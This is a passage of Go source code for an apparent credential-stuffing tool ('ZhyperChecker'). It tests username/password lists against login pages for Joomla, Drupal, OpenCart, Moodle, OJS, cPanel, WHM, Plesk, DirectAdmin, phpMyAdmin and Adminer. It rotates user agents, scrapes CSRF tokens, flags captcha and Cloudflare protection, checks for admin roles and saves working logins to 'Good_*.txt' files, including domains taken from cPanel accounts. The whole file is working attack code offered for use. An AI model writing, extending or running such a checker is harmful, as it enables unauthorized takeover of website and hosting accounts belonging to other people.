	// Extract CSRF token (32 or 64 character hex)
	patterns := []string{
		`name="([a-f0-9]{32})" value="1"`,
		`name="([a-f0-9]{64})" value="1"`,
		`<input type="hidden" name="([a-f0-9]{32})"`,
	}

	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindStringSubmatch(bodyStr)
		if len(matches) > 1 {
			if debug {
				z.log(fmt.Sprintf("Found Joomla CSRF token: %s", matches[1]), "gray")
			}
			return matches[1]
		}
	}

	return ""
}

func (z *ZhyperChecker) detectJoomlaProtection(body string) bool {
	protections := []string{
		"fireshield",
		"cloudflare",
		"recaptcha",
		"captcha",
	}

	for _, p := range protections {
		if strings.Contains(strings.ToLower(body), p) {
			return true
		}
	}

	return false
}

func (z *ZhyperChecker) validateJoomlaFinal(body string, resp *http.Response, debug bool) bool {
	score := 0

	successPatterns := []string{
		"com_cpanel",
		"option=com_admin",
		"administration",
		"control panel",
		"joomla",
	}

	for _, pattern := range successPatterns {
		if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
			score += 2
		}
	}

	failPatterns := []string{
		"error",
		"incorrect",
		"invalid",
		"username and password do not match",
	}

	for _, pattern := range failPatterns {
		if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
			score -= 2
		}
	}

	if debug {
		z.log(fmt.Sprintf("Joomla validation score: %d", score), "gray")
	}

	return score >= 2
}

// Drupal Checker
func (z *ZhyperChecker) checkDrupal(client *http.Client, urlStr, username, password string, debug bool) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
	loginURL := baseURL + "/user/login"

	// Get form_build_id
	req, _ := http.NewRequest("GET", loginURL, nil)
	req.Header.Set("User-Agent", getRandomUserAgent())
	resp, err := client.Do(req)
	if err != nil {
		z.incrStat("err")
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	formBuildID := ""
	re := regexp.MustCompile(`name="form_build_id" value="([^"]+)"`)
	matches := re.FindStringSubmatch(bodyStr)
	if len(matches) > 1 {
		formBuildID = matches[1]
	}

	// Try login
	data := url.Values{}
	data.Set("name", username)
	data.Set("pass", password)
	data.Set("form_id", "user_login")
	data.Set("op", "Log in")
	if formBuildID != "" {
		data.Set("form_build_id", formBuildID)
	}

	req, _ = http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err = client.Do(req)
	if err != nil {
		z.incrStat("err")
		return
	}
	defer resp.Body.Close()

	body, _ = io.ReadAll(resp.Body)
	bodyStr = string(body)

	if z.validateEnhanced(bodyStr, resp, cmsConfigs["drupal"], debug) {
		z.incrStat("valid")
		z.log(fmt.Sprintf("[✓] Drupal Valid: %s|%s|%s", urlStr, username, password), "green")
		z.saveResult("drupal", fmt.Sprintf("%s|%s|%s", urlStr, username, password))
	} else {
		z.incrStat("fail")
		if debug {
			z.log(fmt.Sprintf("[✗] Drupal Failed: %s|%s", urlStr, username), "red")
		}
	}
}

// OpenCart Checker
func (z *ZhyperChecker) checkOpenCart(client *http.Client, urlStr, username, password string, debug bool) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
	loginURL := baseURL + "/admin/index.php?route=common/login"

	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)

	req, _ := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		z.incrStat("err")
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if z.validateEnhanced(bodyStr, resp, cmsConfigs["opencart"], debug) {
		z.incrStat("valid")
		z.log(fmt.Sprintf("[✓] OpenCart Valid: %s|%s|%s", urlStr, username, password), "green")
		z.saveResult("opencart", fmt.Sprintf("%s|%s|%s", urlStr, username, password))
	} else {
		z.incrStat("fail")
		if debug {
			z.log(fmt.Sprintf("[✗] OpenCart Failed: %s|%s", urlStr, username), "red")
		}
	}
}

// Moodle Checker
func (z *ZhyperChecker) checkMoodle(client *http.Client, urlStr, username, password string, debug bool) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
	loginURL := baseURL + "/login/index.php"

	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)
	data.Set("rememberusername", "1")

	req, _ := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		z.incrStat("err")
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if z.validateEnhanced(bodyStr, resp, cmsConfigs["moodle"], debug) {
		z.incrStat("valid")
		z.log(fmt.Sprintf("[✓] Moodle Valid: %s|%s|%s", urlStr, username, password), "green")
		z.saveResult("moodle", fmt.Sprintf("%s|%s|%s", urlStr, username, password))
	} else {
		z.incrStat("fail")
		if debug {
			z.log(fmt.Sprintf("[✗] Moodle Failed: %s|%s", urlStr, username), "red")
		}
	}
}

// OJS Checker
func (z *ZhyperChecker) checkOJS(client *http.Client, urlStr, username, password string, debug bool) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	// Verify OJS
	if !z.verifyOJS(client, baseURL, debug) {
		if debug {
			z.log(fmt.Sprintf("Not an OJS site: %s", baseURL), "gray")
		}
		z.incrStat("fail")
		return
	}

	// Try login
	if z.checkLoginOJSUpgraded(client, baseURL, username, password, debug) {
		z.incrStat("valid")
		z.log(fmt.Sprintf("[✓] OJS Valid: %s|%s|%s", urlStr, username, password), "green")
		z.saveResult("ojs", fmt.Sprintf("%s|%s|%s", urlStr, username, password))

		// Check admin role
		if z.checkOJSAdminRoleStrict(client, baseURL, username, password, debug) {
			z.saveResult("ojs_admin", fmt.Sprintf("%s|%s|%s", urlStr, username, password))
			z.log(fmt.Sprintf("[+] OJS Admin: %s|%s|%s", urlStr, username, password), "green")
		}
	} else {
		z.incrStat("fail")
		if debug {
			z.log(fmt.Sprintf("[✗] OJS Failed: %s|%s", urlStr, username), "red")
		}
	}
}

func (z *ZhyperChecker) verifyOJS(client *http.Client, baseURL string, debug bool) bool {
	// Check cache
	z.ojsCacheMu.Lock()
	cached, exists := z.ojsCache[baseURL]
	z.ojsCacheMu.Unlock()

	if exists {
		return cached
	}

	// Detect OJS from URL patterns
	isOJS := z.detectOJSFromURL(client, baseURL, debug)

	// Cache result
	z.ojsCacheMu.Lock()
	z.ojsCache[baseURL] = isOJS
	z.ojsCacheMu.Unlock()

	return isOJS
}

func (z *ZhyperChecker) detectOJSFromURL(client *http.Client, baseURL string, debug bool) bool {
	ojsURLs := []string{
		baseURL + "/index.php",
		baseURL + "/index.php/index",
		baseURL + "/",
	}

	for _, ojsURL := range ojsURLs {
		req, err := http.NewRequest("GET", ojsURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", getRandomUserAgent())

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		ojsPatterns := []string{
			"Open Journal Systems",
			"ojs",
			"pkp",
			"Public Knowledge Project",
			"/index.php/index/login",
		}

		for _, pattern := range ojsPatterns {
			if strings.Contains(strings.ToLower(bodyStr), strings.ToLower(pattern)) {
				return true
			}
		}
	}

	return false
}

func (z *ZhyperChecker) checkLoginOJSUpgraded(client *http.Client, baseURL, username, password string, debug bool) bool {
	loginURLs := []string{
		baseURL + "/index.php/index/login",
		baseURL + "/index.php/login",
		baseURL + "/login",
	}

	for _, loginURL := range loginURLs {
		data := url.Values{}
		data.Set("username", username)
		data.Set("password", password)
		data.Set("remember", "1")

		req, _ := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", getRandomUserAgent())

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		if z.validateOJSLoginStrict(bodyStr, resp, debug) {
			return true
		}
	}

	return false
}

func (z *ZhyperChecker) validateOJSLoginStrict(body string, resp *http.Response, debug bool) bool {
	score := 0

	successPatterns := []string{
		"user/profile",
		"submissions",
		"dashboard",
		"logout",
		"user/setLocale",
	}

	for _, pattern := range successPatterns {
		if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
			score += 2
		}
	}

	// Check cookies
	for _, cookie := range resp.Cookies() {
		if strings.Contains(strings.ToLower(cookie.Name), "ojs") {
			score += 2
		}
	}

	failPatterns := []string{
		"error",
		"invalid credentials",
		"login failed",
	}

	for _, pattern := range failPatterns {
		if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
			score -= 3
		}
	}

	if debug {
		z.log(fmt.Sprintf("OJS validation score: %d", score), "gray")
	}

	return score >= 2
}

func (z *ZhyperChecker) checkOJSAdminRoleStrict(client *http.Client, baseURL, username, password string, debug bool) bool {
	// Check dashboard for admin indicators
	dashboardURLs := []string{
		baseURL + "/index.php/index/user/profile",
		baseURL + "/index.php/index/dashboard",
		baseURL + "/index.php/index/management",
	}

	for _, dashURL := range dashboardURLs {
		req, _ := http.NewRequest("GET", dashURL, nil)
		req.Header.Set("User-Agent", getRandomUserAgent())

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		adminPatterns := []string{
			"role=\"admin\"",
			"administrator",
			"journal manager",
			"site administration",
			"settings",
			"users",
		}

		score := 0
		for _, pattern := range adminPatterns {
			if strings.Contains(strings.ToLower(bodyStr), strings.ToLower(pattern)) {
				score++
			}
		}

		if score >= 2 {
			return true
		}
	}

	return false
}

// cPanel Checker
func (z *ZhyperChecker) checkCPanel(client *http.Client, urlStr, username, password string, debug bool) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	// Try different cPanel ports
	ports := []string{":2083", ":2082", ""}

	for _, port := range ports {
		loginURL := baseURL + port + "/login/"

		data := url.Values{}
		data.Set("user", username)
		data.Set("pass", password)

		req, _ := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", getRandomUserAgent())

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		if z.validateEnhanced(bodyStr, resp, cmsConfigs["cpanel"], debug) {
			z.incrStat("valid")

			// Extract domains
			extractor := NewCPanelDomainExtractor(client, baseURL+port, debug)
			domains := extractor.extractDomains()

			domainsStr := ""
			if len(domains) > 0 {
				domainsStr = " | Domains: " + strings.Join(domains, ", ")
			}

			credential := fmt.Sprintf("%s|%s|%s%s", urlStr, username, password, domainsStr)
			z.log(fmt.Sprintf("[✓] cPanel Valid: %s", credential), "green")
			z.saveResult("cpanel", credential)
			return
		}
	}

	z.incrStat("fail")
	if debug {
		z.log(fmt.Sprintf("[✗] cPanel Failed: %s|%s", urlStr, username), "red")
	}
}

// WHM Checker
func (z *ZhyperChecker) checkWHM(client *http.Client, urlStr, username, password string, debug bool) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s:2087", parsedURL.Scheme, parsedURL.Host)
	loginURL := baseURL + "/login/"

	data := url.Values{}
	data.Set("user", username)
	data.Set("pass", password)

	req, _ := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		z.incrStat("err")
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if z.validateEnhanced(bodyStr, resp, cmsConfigs["whm"], debug) {
		z.incrStat("valid")
		z.log(fmt.Sprintf("[✓] WHM Valid: %s|%s|%s", urlStr, username, password), "green")
		z.saveResult("whm", fmt.Sprintf("%s|%s|%s", urlStr, username, password))
	} else {
		z.incrStat("fail")
		if debug {
			z.log(fmt.Sprintf("[✗] WHM Failed: %s|%s", urlStr, username), "red")
		}
	}
}

// Plesk Checker
func (z *ZhyperChecker) checkPlesk(client *http.Client, urlStr, username, password string, debug bool) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s:8443", parsedURL.Scheme, parsedURL.Host)
	loginURL := baseURL + "/login_up.php"

	data := url.Values{}
	data.Set("login_name", username)
	data.Set("passwd", password)

	req, _ := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		z.incrStat("err")
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if z.validateEnhanced(bodyStr, resp, cmsConfigs["plesk"], debug) {
		z.incrStat("valid")
		z.log(fmt.Sprintf("[✓] Plesk Valid: %s|%s|%s", urlStr, username, password), "green")
		z.saveResult("plesk", fmt.Sprintf("%s|%s|%s", urlStr, username, password))
	} else {
		z.incrStat("fail")
		if debug {
			z.log(fmt.Sprintf("[✗] Plesk Failed: %s|%s", urlStr, username), "red")
		}
	}
}

// DirectAdmin Checker
func (z *ZhyperChecker) checkDirectAdmin(client *http.Client, urlStr, username, password string, debug bool) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s:2222", parsedURL.Scheme, parsedURL.Host)
	loginURL := baseURL + "/CMD_LOGIN"

	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)

	req, _ := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		z.incrStat("err")
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if z.validateEnhanced(bodyStr, resp, cmsConfigs["directadmin"], debug) {
		z.incrStat("valid")
		z.log(fmt.Sprintf("[✓] DirectAdmin Valid: %s|%s|%s", urlStr, username, password), "green")
		z.saveResult("directadmin", fmt.Sprintf("%s|%s|%s", urlStr, username, password))
	} else {
		z.incrStat("fail")
		if debug {
			z.log(fmt.Sprintf("[✗] DirectAdmin Failed: %s|%s", urlStr, username), "red")
		}
	}
}

// phpMyAdmin Checker
func (z *ZhyperChecker) checkPhpMyAdmin(client *http.Client, urlStr, username, password string, debug bool) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	loginPaths := []string{"/phpmyadmin/", "/pma/", "/phpMyAdmin/"}

	for _, path := range loginPaths {
		loginURL := baseURL + path

		data := url.Values{}
		data.Set("pma_username", username)
		data.Set("pma_password", password)
		data.Set("server", "1")

		req, _ := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", getRandomUserAgent())

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		if z.validateEnhanced(bodyStr, resp, cmsConfigs["phpmyadmin"], debug) {
			z.incrStat("valid")
			z.log(fmt.Sprintf("[✓] phpMyAdmin Valid: %s|%s|%s", urlStr, username, password), "green")
			z.saveResult("phpmyadmin", fmt.Sprintf("%s|%s|%s", urlStr, username, password))
			return
		}
	}

	z.incrStat("fail")
	if debug {
		z.log(fmt.Sprintf("[✗] phpMyAdmin Failed: %s|%s", urlStr, username), "red")
	}
}

// Adminer Checker
func (z *ZhyperChecker) checkAdminer(client *http.Client, urlStr, username, password string, debug bool) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		z.incrStat("err")
		return
	}

	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	// Detect Adminer login form
	if !z.detectAdminerLoginForm(client, baseURL, debug) {
		z.incrStat("fail")
		return
	}

	loginPaths := []string{"/adminer.php", "/adminer/"}

	for _, path := range loginPaths {
		loginURL := baseURL + path

		data := url.Values{}
		data.Set("auth[driver]", "server")
		data.Set("auth[server]", "")
		data.Set("auth[username]", username)
		data.Set("auth[password]", password)
		data.Set("auth[db]", "")

		req, _ := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", getRandomUserAgent())

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		if z.validateEnhanced(bodyStr, resp, cmsConfigs["adminer"], debug) {
			z.incrStat("valid")
			z.log(fmt.Sprintf("[✓] Adminer Valid: %s|%s|%s", urlStr, username, password), "green")
			z.saveResult("adminer", fmt.Sprintf("%s|%s|%s", urlStr, username, password))
			return
		}
	}

	z.incrStat("fail")
	if debug {
		z.log(fmt.Sprintf("[✗] Adminer Failed: %s|%s", urlStr, username), "red")
	}
}

func (z *ZhyperChecker) detectAdminerLoginForm(client *http.Client, baseURL string, debug bool) bool {
	adminerPaths := []string{"/adminer.php", "/adminer/"}

	for _, path := range adminerPaths {
		req, _ := http.NewRequest("GET", baseURL+path, nil)
		req.Header.Set("User-Agent", getRandomUserAgent())

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		if strings.Contains(strings.ToLower(bodyStr), "adminer") {
			return true
		}
	}

	return false
}

// Generic validation
func (z *ZhyperChecker) validateEnhanced(body string, resp *http.Response, config CMSConfig, debug bool) bool {
	score := 0

	for _, pattern := range config.SuccessPatterns {
		if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
			score += 2
		}
	}

	for _, pattern := range config.FailPatterns {
		if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
			score -= 2
		}
	}

	if debug {
		z.log(fmt.Sprintf("%s validation score: %d", config.Name, score), "gray")
	}

	return score >= 2
}

// Save result to file
func (z *ZhyperChecker) saveResult(cms, credential string) {
	filename := "result/Good_" + cms + ".txt"

	// Special naming for WordPress variants
	if cms == "wordpress_admin" {
		filename = "result/Good_WP_Access.txt"
	} else if cms == "wordpress_filemanager" {
		filename = "result/Good_WP_Filemanager.txt"
	} else if cms == "wordpress_appearance" {
		filename = "result/Good_WP_Appearance.txt"
	} else if cms == "wordpress_install_plugin" {
		filename = "result/Good_WP_InstallPlugin.txt"
	} else if cms == "ojs_admin" {
		filename = "result/Good_OJS_Admin.txt"
	}

	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	f.WriteString(credential + "\n")
}

// Helper function: Get random user agent
func getRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

// Main function
func main() {
	rand.Seed(time.Now().UnixNano())

	checker := NewZhyperChecker()
	checker.window.ShowAndRun()
}
